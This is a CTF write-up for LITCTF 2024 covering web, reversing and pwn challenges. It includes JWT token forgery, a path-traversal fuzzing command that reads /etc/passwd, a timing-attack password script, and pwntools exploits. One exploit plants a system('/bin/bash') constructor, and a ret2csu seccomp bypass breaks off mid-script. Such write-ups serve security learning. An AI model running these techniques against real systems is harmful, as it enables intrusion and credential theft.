<h3> LITCTF 2024 </h3>

![image](https://github.com/user-attachments/assets/fd31c0ee-7551-4295-9e93-23c24cc9a468)

Hey guys, `0x1337` here.

This writeup contains the challenge to which I solved during the CTF

### Web (5/6)
- Anti-Inspect
- Jwt-1
- Jwt-2
- Traversed
- KirbyTime

### Reversing (4/6)
- Forgotten Message
- Kablewy
- Burger Reviewer
- Revsite1

### Pwn (5/8)
- Function Pairing
- Infinite Echo
- Recurse
- W4dup 2de
- Iloveseccomp


Ok let's start and note that i won't give very detailed solution to some of the challenges

## Web

#### Anti Inspect

![image](https://github.com/user-attachments/assets/22522d4d-bf2e-4314-a110-f22c437621d9)

From the challenge name you can pretty much tell what this is about

Accessing the provided url works but the content doesn't seem to be rendered
![image](https://github.com/user-attachments/assets/241d3496-90cf-449f-b59f-ead079895b5a)

Trying to open dev tools doesn't work because it prevents me from right clicking

I used curl to get the html source
![image](https://github.com/user-attachments/assets/904d328c-2f47-4412-95d8-12901fd7a426)

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Document</title>
  </head>
  <body>
    <script>
      const flag = "LITCTF{your_%cfOund_teh_fI@g_94932}";
      while (true)
        console.log(
          flag,
          "background-color: darkblue; color: white; font-style: italic; border: 5px solid hotpink; font-size: 2em;"
        );
    </script>
  </body>
</html>
```

We can see the flag but that doesn't work when submitted perhaps due to `%c`

I just removed it and it worked

```
Flag: LITCTF{your_fOund_teh_fI@g_94932}
```

#### Jwt-1

![image](https://github.com/user-attachments/assets/b63b3313-9dff-48ae-b41e-19f40ea8644c)

Accessing the provided url shows this
![image](https://github.com/user-attachments/assets/57cd4dee-e5d0-4150-983e-7813080748e8)

If we click `Get Flag` we should get this
![image](https://github.com/user-attachments/assets/71fddc60-7988-4f34-bc8f-ff79f0d45e32)

We can register here
![image](https://github.com/user-attachments/assets/3cfd1abb-55ee-44ca-9cbf-d22b9fe91fe3)

Doing that we should have a valid credential that can get us logged in

Now that we are authentication I checked the cookie available and saw this jwt token
![image](https://github.com/user-attachments/assets/60ad4601-6236-479f-81fd-f1736d11ac23)

I decoded it using [jwt.io](https://jwt.io/)
![image](https://github.com/user-attachments/assets/54deac36-a15e-485e-a363-b4876ffc0578)

```json
{
  "alg": "HS256",
  "typ": "JWT"
}

{
  "name": "pwner123",
  "admin": false
}
```

I just tried changed the `admin` key value to `true` to see if we could access the flag
![image](https://github.com/user-attachments/assets/0bc05d64-8f23-49c5-bd5f-a2081e6f1750)

Ok that works! And it's because it doesn't check for signature validation

```
Flag: LITCTF{o0ps_forg0r_To_v3rify_1re4DV9}
```

#### Jwt-2
![image](https://github.com/user-attachments/assets/5ebdca89-9358-498d-9625-4e7cb50e2b00)

Ok same web app as the previous one but this time we are provided with the source code

I downloaded it and checking it shows this
![image](https://github.com/user-attachments/assets/37f03dea-d5b9-4a45-96c3-ea702ba04c8b)
![image](https://github.com/user-attachments/assets/352fb263-1395-4c0e-b497-d8b4b1c5b14f)
![image](https://github.com/user-attachments/assets/f3384796-7952-426e-ab82-b70825a6d8d4)

First it imports some libraries

![image](https://github.com/user-attachments/assets/b2aa729a-27a4-459d-a134-90757f8963e5)

This is basically used for signing a jwt payload

![image](https://github.com/user-attachments/assets/178a1758-30d2-4b1a-85c0-0cef81049fc8)

Starts the web app to listen on port 3000 or the port specified in the environment variable

![image](https://github.com/user-attachments/assets/17e72ba8-1af4-480f-8012-b6da13ca61b2)

Let's take a look at the routes now:

- Login: It's going to make sure it's a valid user then sign the username and setting admin to `false`
  
![image](https://github.com/user-attachments/assets/c9d73009-7a1f-408f-b95a-aa23a7540888)

- Signup: It's going to basically just add the user to the accounts array and sign the username and setting admin to `false`

![image](https://github.com/user-attachments/assets/21b734aa-87b5-4eee-8122-f58b9fdf5753)

- Flag:  It's going to make sure the token is prevent then verifies the signature and make sure the username is set to admin meaning it's checking if `admin` is set to `true`

![image](https://github.com/user-attachments/assets/17606190-8267-432d-a6e3-5b03610ab8a2)

Because this verification does check the signature we can't go around this except via setting `admin` to `true`

We can easily do that because we know the jwt secret 

I wrote a [script](https://github.com/7h30ry/writeups/blob/main/LITCTF%202024/Solve%20Scripts/JWT-2/generate.js) to generate a token for me
![image](https://github.com/user-attachments/assets/00311e7d-0400-457f-86d0-86ee0acc517e)

That's pretty much just copy paste from the original server code with some modification

Running it i get a token and i used that to get the flag
![image](https://github.com/user-attachments/assets/b0e38e36-d324-4501-8e3d-c29b3f24e85f)

```
Flag: LITCTF{v3rifyed_thI3_Tlme_1re4DV9}
```

#### Traversed
![image](https://github.com/user-attachments/assets/36ba1ec0-f2b5-4394-9802-11cd84fa8f10)

Accessing the provided url shows this

From the challenge name you can probably tell this is going to be some sort of LFI
![image](https://github.com/user-attachments/assets/709051c1-e0e4-424d-af23-fc3638cded9f)

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Document</title>
  </head>
  <body>
    Welcome! The flag is hidden somewhere... Try seeing what you can do in the url bar.
    There isn't much on this page...
  </body>
</html>
```

The description on the web page suggests that we should play around with the url bar

I just guessed the parameter to be `page` and i was able to include any file
![image](https://github.com/user-attachments/assets/9e9a0d99-f305-45d2-aec2-00138218bf3f)

You could as well attempted to fuzz?

```
ffuf -c -u "http://litctf.org:31778/?FUZZ=../../../../../etc/passwd" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 117,965 -mc all
```

But doing that I got this
![image](https://github.com/user-attachments/assets/c173c0b3-f8b9-4a4d-af10-e914266ebea8)

Well i guess we just needed to guess the parameter

Ok now that we can include any file where's the flag

The challenge didn't specify the flag name nor the location so we need to figure that

I assumed the name would be `flag.txt`

Moving on I checked the content of `/etc/passwd`
![image](https://github.com/user-attachments/assets/34e735d8-1935-4e4b-a297-5149d141f056)

We have a user called `node` so I checked the directory if the flag is there but it wasn't
![image](https://github.com/user-attachments/assets/44bf9286-ca68-43f3-85bf-e75160e2c5e6)

I also tried to retrieve the web app source code but that failed
![image](https://github.com/user-attachments/assets/fd324fd4-6458-4e59-9737-0959abae6402)
![image](https://github.com/user-attachments/assets/10fd0e85-161e-4497-863f-95184ec0dc13)


Next thing i did was to read the environment variable file
![image](https://github.com/user-attachments/assets/a785a32b-1547-4bd9-9728-74828297bd9d)

It downloaded and i checked the content
![image](https://github.com/user-attachments/assets/e80cc063-793c-4957-91cb-7cb3aef00a64)

```
NODE_VERSION=16.20.2
HOSTNAME=ac58ff1071df
YARN_VERSION=1.22.19
BUN_INSTALL=/root/.bun
HOME=/root
PATH=/root/.bun/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
PWD=/app
```

The path to this web app on the filesystem is `/app`

So i checked for the flag there
![image](https://github.com/user-attachments/assets/497a2106-3c01-40c1-89d2-662893ec572a)

We could have also gotten that using this
![image](https://github.com/user-attachments/assets/a924f50e-2fda-4c80-92d2-2c7ac85a6bc9)

```
Flag: LITCTF{backtr@ked_230fim0}
```

#### KirbyTime
![image](https://github.com/user-attachments/assets/75586b0c-7f47-470a-b4a4-e90fc3384536)

We are given the application source code
![image](https://github.com/user-attachments/assets/7c90ff84-da16-4103-9f49-fac30164815e)
![image](https://github.com/user-attachments/assets/823b5646-86c7-44bf-8c25-1c7e47ad651d)

Ok this code is very small and straight forward

If the request method is `POST` it will get the password from the request body and makes sure the length is 7

It then goes ahead with the password check which does this:
- Iterate through the length of the provided input which is 7 and makes sure the character at the current index equals the password at the same index, where the index value is the iterate
- If it's correct it would sleep for one second and if it's the right password we get the success message which is what we would submit as the flag wrapper in `LITCTF{}`

It's clear that we need to perform a timing-based attack, which is a type of side-channel attack. 

This attack exploits the fact that if a character in our provided password matches the correct one, there will be a slight delay before moving on to check the next character. 

We can leverage this time lapse to figure out the correct character at each position

With that here's my solve [script](https://github.com/7h30ry/writeups/blob/main/LITCTF%202024/Solve%20Scripts/Kirbytime/solve.py)

```python
import requests
import string

url = "http://127.0.0.1:5000"
charset = string.ascii_letters
flag = ""

for i in range(7):
    for j in charset:
        pwd = (flag + j).ljust(7, '.')
        password = {
            "password": pwd
        }
        print(password)
        req = requests.post(url, data=password)
        if int(req.elapsed.total_seconds()) > len(flag):
            flag += j
            break
```

Here's it running locally
![image](https://github.com/user-attachments/assets/3bae1748-2aff-4113-880a-eaef250a27fa)

We can see it's retrieving the password
![image](https://github.com/user-attachments/assets/705fee30-96e0-4224-a0db-fdf4f65c8f3d)

I ran it on the remote instance multiple times due to latency issue and timeout (the remote instance lasts for just 9 minutes)
![image](https://github.com/user-attachments/assets/0fc8ba07-c871-42c6-94fa-2e081a027a95)

And YES i used a vps to run it due to latency issue

After some minutes i got the password to be `kBySlaY`

We can confirm it's right
![image](https://github.com/user-attachments/assets/89a3d6d4-9f85-440d-8630-544816017a5c)

```
Flag: LITCTF{kBySlaY}
```

## Reversing

#### Forgotten Message
![image](https://github.com/user-attachments/assets/2dc7ba18-94e2-4d3c-b18d-48eb2a20b440)

I downloaded the binary and searched for low hanging fruits
![image](https://github.com/user-attachments/assets/994dfe94-ff1e-4249-903e-fc98ebb7334c)

```
Flag: LITCTF{y0u_found_Me_3932cc3}
```

#### Kablewy
![image](https://github.com/user-attachments/assets/868f5cf3-fd69-4fb8-ad6c-78bf19f248d4)

When I accessed the url it made my browser hanged so i had to restart

Trying it again I just used curl to get the html content
![image](https://github.com/user-attachments/assets/1376b612-b1e9-4872-a58e-de8e2e838d57)

We can see it's loading a javascript file at `/assets/index-DLdRi53f.js`

So I curl'ed it
![image](https://github.com/user-attachments/assets/42445e41-f1ee-4d52-b27f-6d6b6e75da83)

It gives an ugly js code

I beautified it using [js-beautifier](https://beautifier.io/)
![image](https://github.com/user-attachments/assets/d091e761-2fd0-4c4a-b206-d6c97203e499)

Looking through it I noticed some variables of type `const` storing a base64 encoded value
![image](https://github.com/user-attachments/assets/a9070496-4263-473e-9a22-1990e4b3bc90)

I decoded the first one and got this
![image](https://github.com/user-attachments/assets/58d44641-ae9d-4934-8bc6-adc691c1be0f)

Another base64 value which on decoding gives this
![image](https://github.com/user-attachments/assets/c6164171-6371-4bd5-acb3-67c400c05141)

```js
while (true) console.log('kablewy');
postMessage('L'); 
```

An infinite loop that makes sense as to why the browser crashes

We can see it does `postMessage('L')`

I decoded the second one
![image](https://github.com/user-attachments/assets/fd94c117-eda9-4500-969b-a11ada62d565)

You can notice that the parameter passed into `postMessage` is the flag character

So we need to decode all values, I used some bash command to help automate this
![image](https://github.com/user-attachments/assets/fa1b4d08-40cb-4e69-8c88-c9c6abb7f78c)

```bash
grep " \"[A-Za-z0-9]*\"," app.js | xargs -I {} echo {} | tr -d ',' | cut -d '=' -f 2 | cut -d ' ' -f 2 | base64 -d
```

And now we can fully decode it
![image](https://github.com/user-attachments/assets/e9730e1e-6ee7-49b3-afb7-7b36181b0e2d)

```
grep " \"[A-Za-z0-9]*\"," app.js | xargs -I {} echo {} | tr -d ',' | cut -d '=' -f 2 | cut -d ' ' -f 2 | base64 -d | cut -d '"' -f 4 | base64 -d
```

From the result I just wrote the flag manually

```
Flag: LITCTF{k3F7zH}
```

#### Burger Reviewer
![image](https://github.com/user-attachments/assets/715f7913-cd15-4fbc-97c6-4e84fecda2ef)

We are given the Java source code as an attachement

Downloading it and checking the content shows this
![image](https://github.com/user-attachments/assets/24bdae4a-972c-4b64-b86b-c3a6f4be14cd)
![image](https://github.com/user-attachments/assets/9095b45e-296d-445c-8968-7fcc6df60561)
![image](https://github.com/user-attachments/assets/d479bec7-2779-40e1-9e61-0078141aa904)

I started from the main function
![image](https://github.com/user-attachments/assets/34705ba1-feb1-4b5c-a747-64a381229ef7)

- It receives our input which is the flag
- Sets a boolean variable `gotFlag` to `true`
- Makes sure the length of the input is 42
- Calls the `bun` function and if the result returned from the function isn't `true` it sets `gotFlag` to `false`

Here's what function `bun` does
![image](https://github.com/user-attachments/assets/803354fe-208a-418c-95d5-524089fa1a8a)

- It basically makes sure that the first 7 characters equal the flag format `LITCTF{` and the last character equals `}`

Moving on, it calls some function on our input and does some checks on the `gotFlag` variable
![image](https://github.com/user-attachments/assets/62415151-d822-4acf-a080-f1169c6059ee)

This are the function it calls:
- cheese()
- meat()
- pizzaSauce()
- veggies()

We need to make sure that this function returns `true`

Function cheese()
![image](https://github.com/user-attachments/assets/f3a38202-d843-4af8-879f-d3bb1f6a28c2)

```java
public static boolean cheese(String s) {
  return (s.charAt(13) == '_' && (int)s.charAt(17) == 95 && s.charAt(19) == '_' && s.charAt(26)+s.charAt(19) == 190 && s.charAt(29) == '_' && s.charAt(34)-5 == 90 && s.charAt(39) == '_');
}
```

- This checks if the characters at those position equal the corresponding compared value

Function meat()
![image](https://github.com/user-attachments/assets/e63c4a53-1388-4202-b45c-1b6e5cd1128a)

```java
public static boolean meat(String s) {
  boolean good = true;
  int m = 41;
  char[] meat = {'n', 'w', 'y', 'h', 't', 'f', 'i', 'a', 'i'};
  int[] dif = {4, 2, 2, 2, 1, 2, 1, 3, 3};
  for (int i = 0; i < meat.length; i++) {
    m -= dif[i];
    if (s.charAt(m) != meat[i]) {
      good = false;
      break;
    }
  }
  return good;
}
```

- This iterates through the length of array `meat` and subtracts it by `dif[i]` then compare the input passed into it at that subtracted index to the value at `meat[i]`

Function pizzaSauce()
![image](https://github.com/user-attachments/assets/0cb5580f-4688-43a6-8bc9-d11e64096794)

```java
public static boolean pizzaSauce(String s) {
  boolean[] isDigit = {false, false, false, true, false, true, false, false, true, false, false, false, false, false};
  for (int i = 7; i < 21; i++) {
    if (Character.isDigit(s.charAt(i)) != isDigit[i - 7]) {
      return false;
    }
  }
  char[] sauce = {'b', 'p', 'u', 'b', 'r', 'n', 'r', 'c'};
  int a = 7; int b = 20; int i = 0; boolean good = true;
  while (a < b) {
    if (s.charAt(a) != sauce[i] || s.charAt(b) != sauce[i+1]) {
      good = false;
      break;
    }
    a++; b--; i += 2;
    while (!Character.isLetter(s.charAt(a))) a++;
    while (!Character.isLetter(s.charAt(b))) b--;
  }
  return good;
}
```

- This function performs two main checks on a string s
  - Checking digits
    - The code checks the characters in the string s from index 7 to 20
    - The isDigit array indicates whether the character at each position in the specified range should be a digit (true) or not (false)
    - If the character at any of these positions doesn't match the expected digit status, the function returns false
  - Checking matching characters
    - The code initializes two pointers, a starting at 7 and b starting at 20, and a character array sauce which contains specific characters
    - It checks whether the characters in s at positions a and b match the corresponding characters in sauce
    - After each comparison, the pointers a and b move towards the center of the string, and i is incremented by 2 to check the next pair of characters in sauce
    - If the characters at a and b don't match sauce[i] and sauce[i+1], respectively, the function sets good to false and breaks the loop
    - The inner while loops are used to skip over any non-letter characters in the string  
  
Basically this function validates a string by ensuring:
- The characters in specific positions (from index 7 to 20) are digits or non-digits according to the isDigit array
- The characters at symmetric positions around the middle of the string match the expected sequence defined in sauce

Function veggies()
![image](https://github.com/user-attachments/assets/e1708d42-0168-45f9-b1a7-aef07d74a06e)

```java
public static boolean veggies(String s) {
  int[] veg1 = {10, 12, 15, 22, 23, 25, 32, 36, 38, 40};
  int[] veg = new int[10];
  for (int i = 0; i < veg1.length; i++) {
    veg[i] = Integer.parseInt(s.substring(veg1[i], veg1[i]+1));
  }
  return (veg[0] + veg[1] == 14 && veg[1] * veg[2] == 20 && veg[2]/veg[3]/veg[4] == 1 && veg[3] == veg[4] && veg[3] == 2 && veg[4] - veg[5] == -3 && Math.pow(veg[5], veg[6]) == 125 && veg[7] == 4 && veg[8] % veg[7] == 3 && veg[8] + veg[9] == 9 && veg[veg.length - 1] == 2);
}
```

- Vegs1 array contains indices of the string s from which digits are extracted
- The veg array stores the integers parsed from the characters in s at the positions specified by veg1
- It then goes ahead and check for several mathematical conditions on the values in the veg array

With this we need to generate the flag that satisfies the functions reviewed so far

First we need it to be in the flag format and make sure it's length is 42

```
- LITCTF{..................................}
```

Based on function `cheese()` , working on the string we get this:
![image](https://github.com/user-attachments/assets/7cf1cc02-ada0-4867-97b7-6f5a00bf3d92)

```python
def cheese(s):
    idx = {13: '_', 17: chr(95), 19: '_', 26: chr(190-ord('_')), 29: '_', 34: chr(90+5), 39: '_'}
    s = s

    for key, val in idx.items():
        s[key] = val
    
    return s
```

```
- LITCTF{......_..._._......_.._...._...._.}
```

Working on function `meat()`, i got this
![image](https://github.com/user-attachments/assets/fb87b3b9-8982-442d-80a2-b6af0440713b)

```python
def _meat(s):
    m = 41
    meat = ['n', 'w', 'y', 'h', 't', 'f', 'i', 'a', 'i']
    dif = [4, 2, 2, 2, 1, 2, 1, 3, 3]
    s = s
    
    for i in range(len(meat)):
        m -= dif[i]
        s[m] = meat[i]

    return s
```

```
- LITCTF{......_..._._.i..a._if_th.y_w.n._.}
```

We can't work on `pizzaSauce()` because it's dependent on surrounding characters so we need to first process the numbers in veggies so that `isLetter` works

Working on function `veggies()`, i got this
![image](https://github.com/user-attachments/assets/56ba0683-b5c6-44b6-9dfb-9d2d9811acc3)

I did the math operations by hand

```
flag[22] = '2' # veg[3] == 2 
flag[23] = '2' # veg[3] == veg[4]
flag[15] = '4' # veg[2]/veg[3]/veg[4] == 1
flag[12] = '5' # veg[1] * veg[2] == 20
flag[10] = '9' # veg[0] + veg[1] == 14
flag[25] = '5' # veg[4] - veg[5] == -3
flag[32] = '3' # pow(veg[5], veg[6]) == 125
flag[36] = '4' # veg[7] == 4
flag[38] = '7' or '3' # veg[8] % veg[7] == 3
flag[40] = '2' # veg[veg.length-1] == 2
flag[38] = '7' # veg[8] + veg[9] = 9
```

```python
def veggies(s):
    idx = {
        23: '2',
        15: '4',
        12: '5',
        10: '9',
        25: '5',
        32: '3',
        36: '4',
        38: '7',
        40: '2',
        38: '7'
    }

    s = s

    for key, val in idx.items():
        s[key] = val
    
    return s
```

```
- LITCTF{...9.5_.4._._.i.2a5_if_th3y_w4n7_2}
```

Now for the `pizzaSauce` function which should give us the final flag
![image](https://github.com/user-attachments/assets/74f90c34-9d94-449a-80f4-6c0df428c418)

Here's the solve [script](https://github.com/7h30ry/writeups/blob/main/LITCTF%202024/Solve%20Scripts/Burger%20Reviewer/solve.py)
```python
import string

def cheese(s):
    idx = {13: '_', 17: chr(95), 19: '_', 26: chr(190-ord('_')), 29: '_', 34: chr(90+5), 39: '_'}
    for key, val in idx.items():
        s[key] = val
    return s

def _meat(s):
    m = 41
    meat = ['n', 'w', 'y', 'h', 't', 'f', 'i', 'a', 'i']
    dif = [4, 2, 2, 2, 1, 2, 1, 3, 3]
    for i in range(len(meat)):
        m -= dif[i]
        s[m] = meat[i]
    return s

def veggies(s):
    idx = {
        22: '2',
        23: '2',
        15: '4',
        12: '5',
        10: '9',
        25: '5',
        32: '3',
        36: '4',
        38: '7', 
        40: '2'
    }
    for key, val in idx.items():
        s[key] = val
    return s

def pizzaSauce(s):
    sauce = ['b', 'p', 'u', 'b', 'r', 'n', 'r', 'c']
    isDigit = [False, False, False, True, False, True, False, False, True, False, False, False, False, False]
    a, b, i = 7, 20, 0

    for j in range(7, 21):
        assert (s[j].isdigit() == isDigit[j - 7])

    while a < b:
        s[a] = sauce[i]
        s[b] = sauce[i + 1]
        a += 1
        b -= 1
        i += 2

        while a < b and s[a] not in string.ascii_letters:
            a += 1
        while a < b and s[b] not in string.ascii_letters: 
            b -= 1
    
    return s

flag = list("LITCTF{" + "a"*34 + "}")
cheesed = cheese(flag)
meat_r = _meat(cheesed)
veggie = veggies(meat_r)
final_flag = pizzaSauce(veggie) 
print(''.join(final_flag))
```

We can validate it's the flag by compiling the java file and running it
![image](https://github.com/user-attachments/assets/2554e043-12d2-445b-ac88-93b1561f08d8)

And we have the flag 🙂

```
Flag: LITCTF{bur9r5_c4n_b_pi22a5_if_th3y_w4n7_2}
```

#### Revsite1
![image](https://github.com/user-attachments/assets/06525b86-9803-4b65-96c5-cf0ba03dc1ca)

We are given a url and on accessing it i saw this
![image](https://github.com/user-attachments/assets/167f9a05-3f69-4825-85f5-18f558812af5)

Basically there's a checkbox that receives our input which is the flag and maybe if it's right it would let us know

Looking at the page source i saw this
![image](https://github.com/user-attachments/assets/5a6c91ca-559f-4606-a0d5-0678cb72c898)

We can see it's importing a script and also does this

```js
<script>
function checkFlag(){
	let flag = document.getElementById("flag").value;
	let flag_len = flag.length+1;
	
	let flag_arr = Array(flag_len).fill(0);
	for(let i = 0; i < flag_len-1; i++){
		flag_arr[i] = flag.charCodeAt(i);
	}
	
	let flag_ptr = Module._malloc(flag_len);
	Module.HEAPU8.set(new Uint8Array(flag_arr), flag_ptr);
	let res = Module.cwrap("check_flag", "number", ["number"])(flag_ptr);
	Module._free(flag_ptr);
	
	if(res == 1){
		document.getElementById("right").innerHTML = "ur right :)";
		document.getElementById("wrong").innerHTML = "";
	}else{
		document.getElementById("right").innerHTML = "";
		document.getElementById("wrong").innerHTML = "ur wrong :(";
	}
}
</script>
```

This is Web Assembly (WASM)

```
WebAssembly is an open standard that allows the execution of binary code on the web. This standard, or format code, lets developers bring the performance of languages like C, C++, and Rust to the web development area.
```

If we take a look at the dev tools we can see the wasm file
![image](https://github.com/user-attachments/assets/a7b82052-af3e-41b1-9439-661bdbaa4e52)

I downloaded it
![image](https://github.com/user-attachments/assets/ef16542f-b6b6-42ae-b69e-da684ed04689)

From the above js code we can see that our input is going to be passed as a parameter to `check_flag`

We need to figure out what this function does

Ghidra has a plugin which decompiles a wasm file you can get it [here](https://github.com/nneonneo/ghidra-wasm-plugin/releases)

At this point I imported the wasm file into Ghidra and here's the layout
![image](https://github.com/user-attachments/assets/fbb028af-2ad6-4016-81b0-6a796943942b)

The `check_flag` function is in the `Exports`
![image](https://github.com/user-attachments/assets/015d629a-f47d-4960-b258-829852253c56)

Here's the decompiled [code]()
![image](https://github.com/user-attachments/assets/ae058fce-c4ee-4bc5-abcd-d7509149a16a)
![image](https://github.com/user-attachments/assets/c2959407-b9aa-4fb8-975b-d7252c6d911f)

We can see it setups some value on the stack then compares our input against the value using `strcmp`

I just decoded those values and got the flag

```python
''.join(chr(x) for x in [76, 73, 84, 67, 84, 70, 123, 116, 48, 100, 52, 121, 95, 49, 53, 95, 108, 49, 116, 51, 114, 97, 108, 108, 121, 95, 116, 104, 51, 95, 100, 52, 121, 95, 98, 51, 102, 48, 114, 101, 95, 116, 104, 101, 95, 99, 48, 110, 116, 51, 115, 116, 125, 0, 0, 0, 0, 0, 0, 0])
'LITCTF{t0d4y_15_l1t3rally_th3_d4y_b3f0re_the_c0nt3st}\x00\x00\x00\x00\x00\x00\x00'
```

We can confirm it's the flag
![image](https://github.com/user-attachments/assets/f9afb414-1f8e-4229-8364-b788715bc019)

```
Flag: LITCTF{t0d4y_15_l1t3rally_th3_d4y_b3f0re_the_c0nt3st}
```

### PWN WRITEUP SOON

#### Function Pairing

![image](https://github.com/user-attachments/assets/f8ba6ccb-cec0-450a-b127-04d89ae7c262)

I don't have my solve script for this again

But it was just a basic ret2libc
 
#### Infinite Echo

![image](https://github.com/user-attachments/assets/fcb4bede-6eaa-4cf6-a5d2-3eb701f7bcb4)

No solve script but this was a format string bug

GOT overwrite of printf to system

#### Recurse

![image](https://github.com/user-attachments/assets/957bb89e-2af8-4abe-ae80-649425e6dd01)

This program would let us write into any file 

If the file is written it would recompile `main.c` and execute it

I wrote a function that calls `system('/bin/sh')` as a constructor into `main.c`

Here's my [solve](https://github.com/7h30ry/writeups/blob/main/LITCTF%202024/Solve%20Scripts/Recurse/solve.py)
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('main')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

filterwarnings("ignore")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def solve():
    # call as a constructor: int pwn(void)__attribute__((constructor));int pwn(void){system("touch /tmp/a.txt");return 0;}
    values = ['int pwn(void)', '__attribute__', '((constructor));', 'int pwn(void){', 'system("/bin/bash");', 'return 0;}']

    for i in range(len(values)):
        sleep(1)
        print(f'[*] Sending -> {values[i]}')
        init()
        io.recvuntil("name?")
        io.sendline("main.c")
        io.recvuntil("(W)?")
        io.sendline("W")
        io.recvuntil("Contents?")
        io.sendline(values[i])
        

    io.interactive()

def main():
    
    solve()


if __name__ == '__main__':
    main()
```

#### W4dup 2de

![image](https://github.com/user-attachments/assets/25988898-c782-402a-a3ff-7355040c29b4)

Here's what this main function does

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char buf[32]; // [rsp+0h] [rbp-20h] BYREF

  init_seccomp(argc, argv, envp);
  buf[read(0, buf, 0x100uLL) - 1] = 0;
  return 0;
}
```

Obvious buffer overflow

There's seccomp rule which disables some syscalls

```c
__int64 init_seccomp()
{
  __int64 v1; // [rsp+18h] [rbp-8h]

  v1 = seccomp_init(2147418112LL);
  seccomp_rule_add(v1, 0LL, 0LL, 1LL);
  seccomp_rule_add(v1, 0LL, 59LL, 0LL);
  seccomp_rule_add(v1, 0LL, 322LL, 0LL);
  seccomp_rule_add(v1, 0LL, 187LL, 0LL);
  seccomp_rule_add(v1, 0LL, 89LL, 0LL);
  seccomp_rule_add(v1, 0LL, 267LL, 0LL);
  seccomp_rule_add(v1, 0LL, 19LL, 0LL);
  seccomp_rule_add(v1, 0LL, 17LL, 0LL);
  seccomp_rule_add(v1, 0LL, 295LL, 0LL);
  seccomp_rule_add(v1, 0LL, 327LL, 0LL);
  return seccomp_load(v1);
}
```

Syscall disallowed are:

```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x12 0xc000003e  if (A != ARCH_X86_64) goto 0020
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x0f 0xffffffff  if (A != 0xffffffff) goto 0020
 0005: 0x15 0x0e 0x00 0x00000011  if (A == pread64) goto 0020
 0006: 0x15 0x0d 0x00 0x00000013  if (A == readv) goto 0020
 0007: 0x15 0x0c 0x00 0x0000003b  if (A == execve) goto 0020
 0008: 0x15 0x0b 0x00 0x00000059  if (A == readlink) goto 0020
 0009: 0x15 0x0a 0x00 0x000000bb  if (A == readahead) goto 0020
 0010: 0x15 0x09 0x00 0x0000010b  if (A == readlinkat) goto 0020
 0011: 0x15 0x08 0x00 0x00000127  if (A == preadv) goto 0020
 0012: 0x15 0x07 0x00 0x00000142  if (A == execveat) goto 0020
 0013: 0x15 0x06 0x00 0x00000147  if (A == preadv2) goto 0020
 0014: 0x15 0x00 0x04 0x00000000  if (A != read) goto 0019
 0015: 0x20 0x00 0x00 0x00000014  A = fd >> 32 # read(fd, buf, count)
 0016: 0x15 0x00 0x03 0x00000000  if (A != 0x0) goto 0020
 0017: 0x20 0x00 0x00 0x00000010  A = fd # read(fd, buf, count)
 0018: 0x15 0x00 0x01 0x00000000  if (A != 0x0) goto 0020
 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0020: 0x06 0x00 0x00 0x00000000  return KILL
```

My solution involves:
- Using ret2csu (due to lack of available gadgets to control (rdi, rsi, rdx) to Stack Pivot
- Overwrite the got of read to syscall
- Make use of write to set rax to 0xa which is the syscall number of mprotect
- Sets the bss region to rwx
- Jump to shellcode there
- Shellcode involves using open('flag.txt', 0) to open up the flag file then use sendfile() to print the content to stdout
- Profit

My solve script: [solve](https://github.com/7h30ry/writeups/blob/main/LITCTF%202024/Solve%20Scripts/W4dup%202de/solve.py)

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('main_patched')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

filterwarnings("ignore")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *0x4013bd
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

#    0x00000000004013b0 <+64>:    mov    rdx,r14
#    0x00000000004013b3 <+67>:    mov    rsi,r13
#    0x00000000004013b6 <+70>:    mov    edi,r12d
#    0x00000000004013b9 <+73>:    call   QWORD PTR [r15+rbx*8]
#    0x00000000004013bd <+77>:    add    rbx,0x1
#    0x00000000004013c1 <+81>:    cmp    rbp,rbx
#    0x00000000004013c4 <+84>:    jne    0x4013b0 <__libc_csu_init+64>
#    0x00000000004013c6 <+86>:    add    rsp,0x8
#    0x00000000004013ca <+90>:    pop    rbx
#    0x00000000004013cb <+91>:    pop    rbp
#    0x00000000004013cc <+92>:    pop    r12
#    0x00000000004013ce <+94>:    pop    r13
#    0x00000000004013d0 <+96>:    pop    r14
#    0x00000000004013d2 <+98>:    pop    r15
#    0x00000000004013d4 <+100>:   ret

def init():
    global io

    io = start()


def ret2csu(edi, rsi, rdx, rbx, rbp, ptr, junk):
    csu_pop = 0x4013c6
    csu_call = 0x4013b0

    payload = flat([
